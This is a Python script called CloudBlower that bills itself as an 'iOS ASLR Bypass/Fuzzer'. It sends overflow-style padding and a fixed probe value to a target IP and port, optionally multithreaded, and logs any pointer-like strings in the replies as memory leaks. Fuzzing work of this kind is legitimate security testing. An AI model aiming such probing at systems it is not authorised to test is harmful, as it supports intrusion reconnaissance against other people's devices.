#                                        ___    ,'""""'.
#                                    ,"""   """"'      `.
#                                   ,'        _.         `._
#                                  ,'       ,'              `"""'.
#                                 ,'    .-""`.    ,-'            `.
#                                ,'    (        ,'                :
#                              ,'     ,'           __,            `.
#                        ,""""'     .' ;-.    ,  ,'  \             `"""".
#                      ,'           `-(   `._(_,'     )_                `.
#                     ,'         ,---. \ @ ;   \ @ _,'                   `.
#                ,-""'         ,'      ,--'-    `;'                       `.
#               ,'            ,'      (      `. ,'                          `.
#               ;            ,'        \    _,','                            `.
#              ,'            ;          `--'  ,'                              `.
#             ,'             ;          __    (                    ,           `.
#             ;              `____...  `78b   `.                  ,'           ,'
#             ;    ...----'''' )  _.-  .d8P    `.                ,'    ,'    ,'
#_....----''' '.        _..--"_.-:.-' .'        `.             ,''.   ,' `--'
#              `" mGk "" _.-'' .-'`-.:..___...--' `-._      ,-"'   `-'
#        _.--'       _.-'    .'   .' .'               `"""""
#  __.-''        _.-'     .-'   .'  /
# '          _.-' .-'  .-'        .'
#        _.-'  .-'  .-' .'  .'   /
#    _.-'      .-'   .-'  .'   .'
#_.-'       .-'    .'   .'    /
#       _.-'    .-'   .'    .'
#    .-'            .'
#CloudBlower an IOS Fuzzer made with unique features such as multi threading and randomizing. Written and designed by Sebastian "GhostSec420" Dante Alexander
import socket
import re
import time
import struct
import random
import logging
import argparse
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Debug info or smthn smthn
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("fuzzer_debug.log")
    ]
)

# Regex pattern to identify 64-bit iOS pointers.
# If you're reading this and you aren't me You can refine this pattern further if you know the expected pointer ranges.
POINTER_PATTERN = re.compile(r"(0x[0-9a-fA-F]{12,16})")

def send_payload(target_ip, target_port, payload):
    """Establish connection, send payload, and receive full response."""
    try:
        with socket.create_connection((target_ip, target_port), timeout=5) as sock:
            sock.sendall(payload)
            response = b""
            # Read in a loop until no more data is received.
            while True:
                part = sock.recv(4096)
                if not part:
                    break
                response += part
            return response
    except socket.timeout:
        logging.error("Connection timed out.")
    except Exception as e:
        logging.error(f"Connection error: {e}")
    return b""

def extract_pointers(data_str):
    """Extract pointers using the defined regex pattern."""
    return POINTER_PATTERN.findall(data_str)

def generate_payload(round_num, base_padding=100):
    """
    Generate a fuzz payload with variable padding and a fixed probe marker.
    The padding length is adjusted per round with some added randomness.
    """
    padding_length = base_padding + round_num + random.randint(0, 10)
    padding = b"A" * padding_length
    #You can modify or randomize the probe numnber as needed
    probe = struct.pack("<Q", 0x4141414141414141)
    return padding + probe

class Fuzzer:
    def __init__(self, target_ip, target_port, rounds, leak_log, sleep_time=0.2, threads=1):
        self.target_ip = target_ip
        self.target_port = target_port
        self.rounds = rounds
        self.leak_log = leak_log
        self.sleep_time = sleep_time
        self.threads = threads
        self.log_lock = threading.Lock()

    def log_leak(self, round_num, leaked_pointers):
        """Log any detected leaks to the leak log file with thread-safety."""
        with self.log_lock:
            with open(self.leak_log, "a") as log_file:
                log_file.write(f"Round {round_num}: {leaked_pointers}\n")

    def run_round(self, round_num):
        """Perform a single fuzz round: generate payload, send it, analyze response."""
        payload = generate_payload(round_num)
        response = send_payload(self.target_ip, self.target_port, payload)
        if not response:
            logging.warning(f"Round {round_num}: No response.")
            return None

        # Meow decode the response for pointer meow meow meow.
        response_str = response.decode('latin1', errors="ignore")
        leaked_pointers = extract_pointers(response_str)

        if leaked_pointers:
            logging.info(f"Round {round_num}: Leak detected: {leaked_pointers}")
            self.log_leak(round_num, leaked_pointers)
        else:
            logging.debug(f"Round {round_num}: No leak detected.")
        return leaked_pointers

    def run(self):
        """Run the fuzzer for the specified number of rounds.
           If threads > 1, use a thread pool to send payloads concurrently."""
        logging.info("Starting ASLR memory leak test...")
        try:
            if self.threads > 1:
                # Use ThreadPoolExecutor for multithreaded concurrent fuzzing.
                with ThreadPoolExecutor(max_workers=self.threads) as executor:
                    futures = {executor.submit(self.run_round, i): i for i in range(self.rounds)}
                    for future in as_completed(futures):
                        
                        _ = future.result()
                        # A small sleep can throttle submissions if needed in your scenario.
                        time.sleep(self.sleep_time)
            else:
                # Run rounds.
                for i in range(self.rounds):
                    self.run_round(i)
                    time.sleep(self.sleep_time)
        except KeyboardInterrupt:
            logging.info("Fuzzing interrupted by user.")
        finally:
            logging.info("Memory leak testing complete.")

def parse_args():
    parser = argparse.ArgumentParser(description="iOS ASLR Bypass/Fuzzer")
    parser.add_argument("--ip", type=str, default="192.168.1.50", help="Target IP address")
    parser.add_argument("--port", type=int, default=1337, help="Target port")
    parser.add_argument("--rounds", type=int, default=500, help="Number of fuzz rounds")
    parser.add_argument("--log", type=str, default="aslr_leaks.log", help="Leak log file")
    parser.add_argument("--threads", type=int, default=1, help="Number of concurrent threads")
    parser.add_argument("--sleep", type=float, default=0.2, help="Sleep time between rounds (seconds)")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    fuzzer = Fuzzer(
        target_ip=args.ip,
        target_port=args.port,
        rounds=args.rounds,
        leak_log=args.log,
        sleep_time=args.sleep,
        threads=args.threads
    )
    fuzzer.run()
